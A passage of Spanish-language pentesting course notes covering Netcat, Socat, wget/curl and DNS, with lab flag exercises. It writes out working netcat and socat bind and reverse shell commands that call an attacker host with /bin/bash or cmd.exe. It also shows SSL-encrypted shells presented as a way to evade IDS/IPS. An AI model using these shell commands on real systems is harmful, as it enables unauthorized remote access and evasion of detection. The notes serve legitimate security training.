listening on [any] 4444 ...
```

Cuando recibimos una conexión obtenemos:

```bash
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43447
This chat is from the linux machine
```

Esta nos dice qué máquina actúa como cliente, que máquina actúa como servidor y desde que puerto se manda la conexión.

<br />

##### 2.6.3. Transferiendo ficheros con Netcat.

Veamos ahora un uso práctico de Netcat.

Vamos a utilizar esta herramienta para escuchar con Netcat en un puerto y lanzar una conexión en el que envíamos un fichero con Netcat desde otra máquina obteniendo efectivamente una transferencia de ficheros entre dos máquinas.

En primer lugar, en una máquina activamos un puerto en escucha:

```bash
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
```

El contenido que se reciba en esa conexión será enviado a un fichero gracias a un operador redirector (>).

En la otra máquina seguidamente enviamos el contenido de un fichero con el operador redirector inverso (<) sobre la conexión saliente que envía:

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

En el puerto que estaba escuchando, después de que pase un rato (dado que se trata de un fichero pequeño) cancelamos el proceso con Ctrl+C: 

```bash
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>
```

Por último testeamos que el fichero se haya transferido correctamente, generalmente vale con observar el tamaño del ficheor y comrpobar que este coincide con el tamaño del fichero original en la otra máquina.

<br />

##### 2.6.4. Administración remota con Netcat (Bind/Reverse shell).

Una de las mejores características de Netcat como herramienta de pentesting es la capacidad de realizar una redirección de comandos o, dicho de otra manera, efectuar una administración remota.

Esto se puede dar en dos contextos, una bind shell es una forma de conexión en la que el atacante desde una máquina remota se conecta a la máquina comprometida y pide una shell. Por el contrario en una reverse shell el atacante recibe una conexión de la máquina comprometida. 

La reverse shell siempre suele ser la opción de preferencia pues en la mayoría de los casos, los firewalls u otras herramientas de seguridad no suelen vigiliar (o las vigilan con menos frecuencia) las conexiones salientes.

En el caso de netcat, una bind shelll se percibiría de la siguiente manera:

*Máquina comprometida*:

```bash
nc -nlvp 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Máquina atacante*:

```bash
nc -nv 10.11.0.22 4444
```

La máquina comprometida espera una conexión que deriva hacia la aplicación que correra un entorno de línea de comandos mientras que la máquina atacante sencillamente ejecuta una conexión saliente con netcat. La opción -e ejecuta un programa que comparte a través de la conexión después de que esta haya sido establecida.

Por otra parte, una reverse shell sería:

*Máquina comprometida*:

```bash
nc -nv 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Máquina atacante*:

```bash
nc -nlvp 10.11.0.22 4444
```

La máquina comprometida introduce el flow de una aplicación que genera una shell sobre una conexión saliente que es recibida por la máquina atacante.

<br />

##### 2.6.5. Practice -Netcat.

**1er Flag**

El primer ejercicio nos dice que existe un puerto 5555 que puede escucha una conexión del tipo nc -lvp -e /bin/bash, es decir, que la conexión nos dará una shell.
Así, nos conectamos y:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221206212414.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2do Flag**

En la segunda, conseguimos acceso a nuestra flag utilizando un binario que despliega una conexión a un servidor en escucha en nuestra máquina (reverse shell).

<br />

**3er Flag**

En este necesitamos transferir un binario que necesitamos correr como root (en nuestra máquina) para obtener la flag. Así procedemos como en el ejemplo anterior para obtener el fichero y la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221206215353.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.7. Socat.

Socat es una utilidad de línea de comandos que abre dos streams de datos de forma bidireccional y transfiere datos entre ellos. De cara al pentesting, Socat es algo así como la evolución de Netcat ya que ofrece las mismas funciones con algunas adiciones.

<br />

##### 2.7.1. Netcat vs Socat.

Conexióna puerto externo con Netcat y Socat.

```bash
kali@kali:~$ nc <remote server's ip address> 80

kali@kali:~$ socat - TCP4:<remote server's ip address>:80
```

Escuchando en un puerto con Netcat y Socat:

```bash
kali@kali:~$ sudo nc -lvp localhost 443

kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT
```

Es necesario el 'sudo' para escuchar en puertos que estén por debajo de 1000.

<br />

##### 2.7.2. Socat File Transfers.

Para transferir ficheros Socat tiene un procedimiento distinto. Con Netcat envíamos los contenidos del fichero a lo largo de una conexión con Netcat. La conexión entrante en la máquina remota se guardaba en un fichero y deb esa forma se completaba la transferencia. 

En Socat se lleva a cabo un procedimiento distinto en el que en lugar de enviar en el fichero sobre una conexión saliente se espera a que el fichero se descargue mediante una petición entrante.

En primer lugar se prepara un fichero para que esté accesible desde un puerto en escucha:

```bash
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

Seguidamente, desde la otra maquina se descarga el fichero ques e copia en un fichero creado localmente también por Socat:

```bash
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

C:\Users\offsec> type received_secret_passwords.txt
"try harder!!!"
```

Es un procedimiento parecido a descargar un fichero de un servidor HTTP con Curl o Wget.

<br />

##### 2.7.3. Socat Reverse Shells.

Veamos ahora cómo se crean las reverse shells en Socat. 

Máquina local:

```bash
socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

Máquina remota:

```bash
socat -d -d TCP4:10.11.0.22:443 EXEC:/bin/bash
```

Un comando análogo para Windows sería:

```cmd
socat -d -d TCP4:192.168.1.142:5000 EXEC:cmd.exe,pipes
```

Después de que se efectúe la conexión recibimos en la máquina local una shell:

```bash
... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443
... socat[4388] N using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

<br />

##### 2.7.4. Socat Encrypted Bind Shells.

Socat nos permite utilizar certificados SSL para cifrar BindShells. Esto es especialmente útil para evitar herramientas de detección como IDS/IPS, etc.

En primer lugar, generamos un certificado SSL con *openssl*:

```bash
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
Generating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Seguidamente, enviamos la llave privada y el certificado sobre un fichero .pem para que Socat sea capaz de leerlo:

```bash
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Después empleamos el siguiente comando en la máquina remota para aceptar una conexión cifrada después de haber llevado también el certificado a dicha máquina:

```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```


Y desde la máquina local lanzamos una conexión:

```bash
kali@kali:~$ socat - OPENSSL:10.11.0.4:443,verify=0
id
uid=0(root) gid=0(root) groups=0(root)
whoami
roo
```

<br />

##### 2.7.5. Practice Socat.

Veámos ahora un conjunto de ejercicios con Socat dados entre una máquina Windows y una máquina Linux. El primer paso es descargar [Socat para Windows](https://github.com/tech128/socat-2.0.0-b8-windows) en la máquina Windows que vayamos a utilizar..

**File Transfer**

En primer lugar vamos a preparar una transferencia de ficheros entre dispositivos, vamos a descargar para la máquina Windows el fichero [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1). Como comentábamos al principio, al contrario de lo que ocurría con Netcat, en Socat la transferencia de ficheros funciona como una descarga de ficheros entre un servidor y un cliente. 

De esta forma, preparamos la máquina que tiene el fichero (nuestra kali) para recibir una petición de descarga del fichero powercat.ps1. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207185129.png' | relative_url }}" text-align="center"/>
</div>

Mientras tanto, en la otra máquina preparamos una petición de descarga y creamos un fichero en nuestro escritorio:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207185238.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Encrypted Reverse Shell**

Ahora, vamos a preparar una reverse shell y la vamos a cifrar. Recordamos que una reverse shell es una petición de administración remota de un cliente en un servidor que se inicia mediante una conexión del servidor al cliente. 

En primer lugar preparamos un certificado y llevamos tanto la llave privada como el certificiado sobre un fichero .pem y lo transportamos a la máquina Windows tal y como hemos hecho en el ejercicio anterior:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207205235.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, en la máquina kali preparamos un listener para recibir una conexión  cifrada:

```bash
socat -d -d OPENSSL-LISTEN:<PORT>,cert=rev-shell.pem,verify=0 STDOUT
```

Y desde Windows iniciamos una conexión con Socat utilizando el certificado y la clave transferidas antes:

```cmd
socat -d -d OPENSSL:<IP>:<PORT>,cert=rev-shell.pem,verify=0 EXEC:cmd.exe,pipes
```

<br />

**Encrypted Bind Shell**

Si intentamos poner en contacto la máquina Kali con Windows el firewall del segundo actuará bloqueando la solicitud. Por tanto, lo preferible siempre es intentar realizar una reverse shell ya que las conexiones salientes generalmente no se bloquean.

<br />

**1er Flag**

En este caso se nos da acceso a una máquina y nos pide que imaginemos que no queremos que nadie sea capaz de ver el tráfico que mandamos. Es decir, que generemos una conexión de administración remota cifrada con Socat.

De esta forma, en la información del ejercicio se nos dice que existe un puerto en el que Socat está escuchando, por la naturaleza del ejercicio asumismos que se trata de un servicio de Shell y nos conectamos con el siguiente comando:

```bash
socat openssl:192.168.150.52:32794,verify=0
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207231254.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2do Flag**

En este caso estamos en la misma situación que antes con la diferencia de que esta vez estamos ante una máquina Linux que tiene un firewall que bloquea un intento de efectuar una 'encrypted bind shell'. 

Por tanto, intentamos realizar una reverse shell. Preparamos un listener en nuestra kali con el comando después de haber preparado el correspondiente certificado y haber pasado la clave y certificado a un fichero .pem que Socat pueda leer:

```bash
socat -d -d - openssl-listen:4444,cert=rev-shell.pem,verify=0
```

Y en la máquina Linux víctima utilizamos la herramienta preparada para efectuar una conexión:

```bash
/usr/bin/encrypted-reverse-shell 192.168.119.150 4444
```

Y desde la nueva sesión abierta obtenemos la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207233338.png' | relative_url }}" text-align="center"/>
</div>

<br />


#### 2.8. HTTP (wget and curl).

- *Wget*

*Wget* es una utilidad muy útil para descargar archivos desde un servidor web. Ingresemos **wget** en la terminal de Linux para mostrar su uso.

```
kali@kali:~$ wge
wget: missing URL
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```

Para comprender mejor cómo usar wget, descarguemos el programa del curso después de este (PEN-200). El PDF se encuentra en https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf . En la terminal de Linux, ingresaremos *wget https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf*.

```
kali@kali:~$ wget https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
--2021-06-30 06:27:55--  https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
Resolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5
Connecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676301 (660K) [application/pdf]
Saving to: ‘penetration-testing-with-kali.pdf’

penetration-testing-with-kali.pdf                       100%[============================================================================================================================>] 660.45K   743KB/s    in 0.9s    

2021-06-30 06:27:56 (743 KB/s) - ‘penetration-testing-with-kali.pdf’ saved [676301/676301]

kali@kali:~$ ls
Desktop  Documents  Downloads  Music  penetration-testing-with-kali.pdf  Pictures  Public  Templates  Videos
```

Como se muestra arriba, el archivo **penetración-testing-with-kali.pdf** está en el directorio de trabajo actual. Esto se puede abrir ejecutando **xdg-open** , como se muestra en la siguiente captura de pantalla:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230117093254.png' | relative_url }}" text-align="center"/>
</div>

A continuación, cubriremos cómo cambiar el nombre del archivo descargado. Esto se puede hacer usando la opción *-O* (una 'o' mayúscula). La opción 'o' minúscula registrará los mensajes que se muestran en el terminal en el archivo especificado. Examinemos las dos opciones, comenzando con *-O*.

```
kali@kali:~$ wget https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf -O PEN-200-Syllabus.pdf
--2021-06-30 06:59:31--  https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
Resolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5
Connecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676301 (660K) [application/pdf]
Saving to: ‘PEN-200-Syllabus.pdf’

PEN-200-Syllabus.pdf                                    100%[============================================================================================================================>] 660.45K  2.31MB/s    in 0.3s    

2021-06-30 06:59:32 (2.31 MB/s) - ‘PEN-200-Syllabus.pdf’ saved [676301/676301]

kali@kali:~$ ls
Desktop  Documents  Downloads  Music  PEN-200-Syllabus.pdf  penetration-testing-with-kali.pdf  Pictures  Public  Templates  Videos

kali@kali:~$ file PEN-200-Syllabus.pdf
PEN-200-Syllabus.pdf: PDF document, version 1.5
```

El archivo descargado se guarda con el nombre que especificamos a través de la opción *-O*. A continuación, ejecutemos el comando *wget* con la opción *-o* para guardar el registro en un archivo.

```
kali@kali:~$ wget https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf -o log

kali@kali:~$ file log
log: UTF-8 Unicode text

kali@kali:~$ cat log
--2021-06-30 07:02:17--  https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
Resolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5
Connecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676301 (660K) [application/pdf]
Saving to: ‘penetration-testing-with-kali.pdf.1’

     0K .......... .......... .......... .......... ..........  7%  842K 1s
    50K .......... .......... .......... .......... .......... 15%  966K 1s
   100K .......... .......... .......... .......... .......... 22%  168M 0s
   150K .......... .......... .......... .......... .......... 30% 3.04M 0s
   200K .......... .......... .......... .......... .......... 37% 2.55M 0s
   250K .......... .......... .......... .......... .......... 45% 1.13M 0s
   300K .......... .......... .......... .......... .......... 52% 3.04M 0s
   350K .......... .......... .......... .......... .......... 60% 1.53M 0s
   400K .......... .......... .......... .......... .......... 68% 1.62M 0s
   450K .......... .......... .......... .......... .......... 75%  891K 0s
   500K .......... .......... .......... .......... .......... 83% 4.03M 0s
   550K .......... .......... .......... .......... .......... 90% 3.01M 0s
   600K .......... .......... .......... .......... .......... 98% 1.50M 0s
   650K ..........                                            100% 7.17M=0.4s

2021-06-30 07:02:17 (1.67 MB/s) - ‘penetration-testing-with-kali.pdf.1’ saved [676301/676301]
```

Terminemos nuestra introducción de wget examinando la opción *--recursive* . Esto es extremadamente útil cuando queremos reconstruir un sitio web o copiar un sitio web completo a nuestro host.

Debemos tener cuidado al usar esta opción, ya que algunos sitios web contienen una gran cantidad de datos y llenarán nuestro disco duro. En el siguiente ejemplo, ejecutemos *wget* con la opción *--recursive en* https://www.kali.org/. Después de darle un poco de tiempo para demostrar la copia del sitio web, podemos detener la copia del sitio web presionando C + c .

```
kali@kali:~$ wget --recursive https://www.kali.org/
--2021-07-01 11:42:15--  https://www.kali.org/
Resolving www.kali.org (www.kali.org)... 35.185.44.232
Connecting to www.kali.org (www.kali.org)|35.185.44.232|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35937 (35K) [text/html]
Saving to: ‘www.kali.org/index.html’

www.kali.org/index.html                                 100%[============================================================================================================================>]  35.09K  --.-KB/s    in 0.09s   

2021-07-01 11:42:15 (381 KB/s) - ‘www.kali.org/index.html’ saved [35937/35937]

Loading robots.txt; please ignore errors.
--2021-07-01 11:42:15--  https://www.kali.org/robots.txt
Reusing existing connection to www.kali.org:443.
HTTP request sent, awaiting response... 200 OK
Length: 103 [text/plain]
Saving to: ‘www.kali.org/robots.txt’

www.kali.org/robots.txt                                 100%[============================================================================================================================>]     103  --.-KB/s    in 0s      

2021-07-01 11:42:15 (224 MB/s) - ‘www.kali.org/robots.txt’ saved [103/103]
...
```

Cuando se completa este proceso, se puede buscar el sitio web dentro del directorio actual. Hagamos una lista del contenido descargado en la terminal.

```
kali@kali:~$ ls
Desktop  Documents  Downloads  Music  PEN-200-Syllabus.pdf  Pictures  Public  Templates  Videos  www.kali.org

kali@kali:~$ ls www.kali.org
about-us  community  css   downloads  get-kali         images      index.min.css  kali-nethunter  partnerships-sponsorships  releases    rss.xml        sitemap.xml
blog      contact    docs  features   get-kali.min.js  index.html  index.min.js   newsletter      plugins                    robots.txt  script.min.js  style.min.css
```

Wget organiza cuidadosamente el contenido descargado en la misma estructura que el sitio web. Esta puede ser una actividad útil para que un profesional de la seguridad busque en todo un sitio web elementos como credenciales de texto no cifrado, bases de datos, directorios no controlados, etc.

<br />

- *Curl*

Otro cliente que podemos usar para copiar archivos de servidores es *Curl*, que significa "URL de Cliente". Curl es extremadamente poderoso porque ofrece una cantidad increíble de opciones que se pueden usar para manipular la solicitud al servidor.

Antes de explorar las diversas opciones, repasemos el uso básico de curl. Los archivos previamente descargados con wget fueron eliminados antes de estos ejercicios.

```
kali@kali:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

kali@kali:~$ curl https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

En el resultado anterior, curl no mostró los resultados del archivo porque intentamos descargar un PDF, que es un archivo binario. Por defecto, curl no muestra archivos binarios.

Sigamos los consejos del mensaje de advertencia y agreguemos la opción de salida *-o* con un nombre para el archivo.

```
kali@kali:~$ curl https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf -o PEN-200-Syllabus.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  660k  100  660k    0     0   436k      0  0:00:01  0:00:01 --:--:--  435k
 
kali@kali:~$ file PEN-200-Syllabus.pdf
PEN-200-Syllabus.pdf: PDF document, version 1.5
```

Después de realizar estos cambios, este archivo se descargó y luego se puede verificar como PDF usando el comando de *archivo*.

Examinemos el uso básico de curl en una página web en lugar de un archivo binario.

```
kali@kali:~$ curl https://kali.org/
<!doctype html><html lang=en-us><head itemscope itemtype=https://www.kali.org/><meta charset=utf-8><meta name=viewport content="width=device-width"><title itemprop=name>Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution</title><meta itemprop=name content="Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution"><meta name=application-name content="Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution"><meta name=twitter:title content="Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution"><meta property="og:site_name" content="Kali Linux"><meta property="og:title" content="Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution"><meta itemprop=description content="Home of Kali Linux, an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments."><meta name=description content="Home of Kali Linux, an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments."><meta name=twitter:description content="Home of Kali Linux, an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments."><meta property="og:description" content="Home of Kali Linux, an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments."><meta name=keywords content="kali,linux,kalilinux,Penetration,Testing,Penetration Testing,Distribution,Advanced"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=msapplication-navbutton-color content="#367BF0"><meta name=theme-color content="#367BF0"><meta name=language content="English"><meta property="og:locale" content="en_US"><meta itemprop=image content="https://www.kali.org//images/kali-logo.svg"><meta name=twitter:image content="https://www.kali.org//images/kali-logo.svg"><meta name=twitter:image:src content="https://www.kali.org//images/kali-logo.svg"><meta property="og:image" content="https://www.kali.org//images/kali-logo.svg"><meta property="og:updated_time" content="2021-06-29T00:00:00Z"><meta name=twitter:site content="@kalilinux"><meta name=twitter:creator content="@kalilinux"><link rel="alternate icon" class=js-site-favicon type=image/png href=https://www.kali.org/images/favicon.png><link rel=icon class=js-site-favicon type=image/svg+xml href=https://www.kali.org/images/favicon.svg><base href=https://www.kali.org/><link rel=canonical href=https://www.kali.org/ itemprop=url><meta name=twitter:url content="https://www.kali.org/"><meta name=url content="https://www.kali.org/"><meta property="og:url" content="https://www.kali.org/"><link rel=sitemap type=application/xml title=Sitemap href=https://www.kali.org/sitemap.xml><link href=https://www.kali.org/rss.xml type=application/rss+xml title="Kali Linux" rel=alternate><link href=https://www.kali.org/rss.xml type=application/rss+xml title="Kali Linux" rel=feed><link href=https://www.kali.org/style.min.css rel=stylesheet><style>:root{--primary-color:#367BF0;--body-color:#f9f9f9;--text-color:#636363;--text-color-dark:#242738;--white-color:#ffffff;--light-color:#f8f9fa;--font-family:Noto Sans}body.dark-theme{--body-color:black;--text-color:#e1e1e1;--text-color-dark:white;--white-color:#121212;--light-color:#1A1A1A}</style><script>const $=document.querySelector.bind(document),$$=document.querySelectorAll.bind(document)</script></head><body><header class=bg-cover><nav class=container><a id=logo href=https://www.kali.org/ style=background-image:url(https://www.kali.org//images/kali-logo.svg)></a><ul id=navigation><li><a href=/get-kali/>Get Kali</a></li><li><a href=/blog/>Blog</a></li><li class=dropdown-menu><span>Documentation <i class=ti-angle-down></i></span><div><a href=/docs/>Kali Linux Documentation</a>
<a href=https://tools.kali.org/>Kali Tools Documentation</a>
...
```

El contenido de la página web se muestra en la pantalla del terminal después de nuestra ejecución básica de *curl*. Analicemos ahora otro ejemplo de sitio que mostrará un mensaje de advertencia con la misma sintaxis curl.

```
kali@kali:~$ curl https://www.offensive-seucrity.com/
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

Observemos por qué puede estar ocurriendo el mismo error al analizar los encabezados HTTP usando la opción *-I*.

```
kali@kali:~$ curl https://www.offensive-security.com/ -I
HTTP/2 200 
server: nginx
date: Wed, 30 Jun 2021 17:57:02 GMT
content-type: text/html; charset=UTF-8
content-length: 14859
x-sucuri-id: 11005
x-xss-protection: 1; mode=block
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
strict-transport-security: max-age=31536000; includeSubdomains; preload
content-security-policy: upgrade-insecure-requests;
link: <https://www.offensive-security.com/>; rel=shortlink
vary: Accept-Encoding,User-Agent
content-encoding: gzip
x-sucuri-cache: HIT
```

La advertencia aún muestra la página como binaria debido al encabezado de codificación de contenido del servidor web. Notaremos que la codificación es 'gzip'. Esto significa que la página envía un archivo zip comprimido como método de entrega al navegador, que se registra como binario. Cuando se presentan con este tipo de errores, consultar la página de man, o buscar en Google el mensaje de error puede ser increíblemente útil. Podemos superar este error usando la opción *--compressed*. Los encabezados web y la forma en que funcionan los sitios web se tratarán con más detalle en la sección "Web" de este curso. Ejecutemos el comando curl nuevamente con la opción apropiada para este sitio.

```
kali@kali:~$  curl https://www.offensive-security.com/ --compressed
<!doctype html>

  <html class="no-js"  lang="en-US">

        <head> <script type="text/javascript">if(!gform){document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0});var gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),null==t&&(t=10),gform.hooks[o][n].push({tag:i,callable:r,priority:t})},doHook:function(o,n,r){if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[o][n]){var t,i=gform.hooks[o][n];i.sort(function(o,n){return o.priority-n.priority});for(var e=0;e<i.length;e++)"function"!=typeof(t=i[e].callable)&&(t=window[t]),"action"==o?t.apply(null,r):r[0]=t.apply(null,r)}if("filter"==o)return r[0]},removeHook:function(o,n,r,t){if(null!=gform.hooks[o][n])for(var i=gform.hooks[o][n],e=i.length-1;0<=e;e--)null!=t&&t!=i[e].tag||null!=r&&r!=i[e].priority||i.splice(e,1)}}}</script>
...
```

También tendremos que lidiar con resultados erróneos en muchas configuraciones de laboratorio, ya que encontramos certificados web. Para suprimir estos errores y continuar, se puede utilizar la opción *-k*. Fuera de los laboratorios, no se recomienda usar esta opción a menos que confiemos en el servidor web. Usemos nuestro host de ejercicio para mostrar el error y superarlo.

```
kali@kali:~$ curl https://192.168.65.61/
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

Cuando agregamos la opción *-k* , se ignorará el error de SSL y se podrá recuperar la página.

```
kali@kali:~$ curl -k https://192.168.65.61/
WELCOME!
```

Curl también puede aprovechar un proxy antes de extraer el contenido de una página web usando la opción **-x .** La sintaxis para esto es la siguiente:

```
curl -x [protocol://]host[:port] URL
```

En el host del ejercicio, se está ejecutando un servicio de proxy. Este proxy permite una conexión a un sitio web en *http://172.16.54.20/* .

Intentemos una solicitud curl para esa URL web.

```
kali@kali:~$ curl http://172.16.54.20/
^C

```

El intento de curl terminó colgando y necesitábamos eliminar el intento de conexión con C + c . Intentemos solicitar la misma página web mediante el servicio proxy del anfitrión del ejercicio en el puerto _3128_ con la opción **-x .**

```
kali@kali:~$ curl -x http://192.168.65.61:3128/ http://172.16.54.20/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
The following was written shortly after my arrest...

                       \/\The Conscience of a Hacker/\/

                                      by

                               +++The Mentor+++
...
```

El uso del servicio de proxy en el host del ejercicio devolvió la página web ubicada en **http://172.16.54.20/** .

Con las habilidades aprendidas en esta sección, podemos obtener páginas web, archivos y sitios desde la línea de comandos. También podemos utilizar proxies en la comunicación web.

<br />

**Exercises**

**1. Encuentre la bandera en el sitio web http://$IP/. La bandera comenzará con 'WGET'.**

```bash
wget -r http://192.168.114.61/ &>/dev/null; grep -ri 'wget' 192.168.114.61; rm -r 192.168.114.61
```

El primer comando copia recursivamente el contenido de la web, el segundo busca recursivamente en sus contenidos (-r) una línea que contega el string en máyúsculas o en minúsculas 'wget' (-i).

<br />

**3.  El sitio web en https://$IP/ tiene un certificado SSL no válido. Omita esto y obtenga la bandera.**

```bash
curl https://192.168.114.61 -k
```

<br />

#### 2.9. DNS (host, dig, nslookup)

El DNS es facilitado por una estructura jerárquica que se divide en varias zonas, comenzando con la zona raíz de nivel superior. Analicemos más de cerca el proceso y los servidores involucrados en la resolución de un nombre de host como www.megacorpone.com.

El proceso de resolución de un nombre de host comienza cuando el nombre de host se ingresa en un navegador u otra aplicación. El navegador lo pasa al cliente DNS del sistema operativo, luego el sistema operativo reenvía la solicitud al servidor DNS externo que está configurado para usar. Este primer servidor de la cadena se conoce como *DNS recursor* y es responsable de interactuar con la infraestructura DNS y devolver los resultados al cliente DNS. El recursor de DNS contacta con uno de los servidores en la zona raíz de DNS. Luego, el servidor raíz responde con la dirección del servidor responsable de la zona que contiene el Dominio de nivel superior (TLD), en este caso, el TLD *.com*

Una vez que el recursor de DNS recibe la dirección del servidor DNS de TLD, consulta la dirección del servidor de nombres autorizado para el dominio *megacorpone.com.* El servidor de nombres autorizado es el paso final en el proceso de búsqueda de DNS y contiene los registros de DNS en una base de datos local conocida como archivo de zona. Por lo general, alberga dos zonas para cada dominio: 

- la *zona de búsqueda directa* que se usa para encontrar la dirección IP de un nombre de host específico.

- la *zona de búsqueda inversa* (si la configura el administrador) que se usa para encontrar el nombre de host de una dirección IP específica. Una vez que el recursor DNS proporciona al cliente DNS la dirección IP para www.megacorpone.com, el navegador puede contactar al servidor web correcto en su dirección IP y cargar la página web.

Para mejorar el rendimiento y la confiabilidad de DNS, el almacenamiento en caché de DNS se utiliza para almacenar copias locales de los registros de DNS en varias etapas del proceso de búsqueda. Esta es la razón por la que algunas aplicaciones modernas, como los navegadores web, mantienen una caché de DNS separada. El cliente DNS local del sistema operativo también mantiene su propia caché DNS, junto con cada uno de los servidores DNS en el proceso de búsqueda. Los propietarios de dominios también pueden controlar cuánto tiempo un servidor o cliente almacena en caché un registro DNS a través de su campo tiempo de vida (TTL).

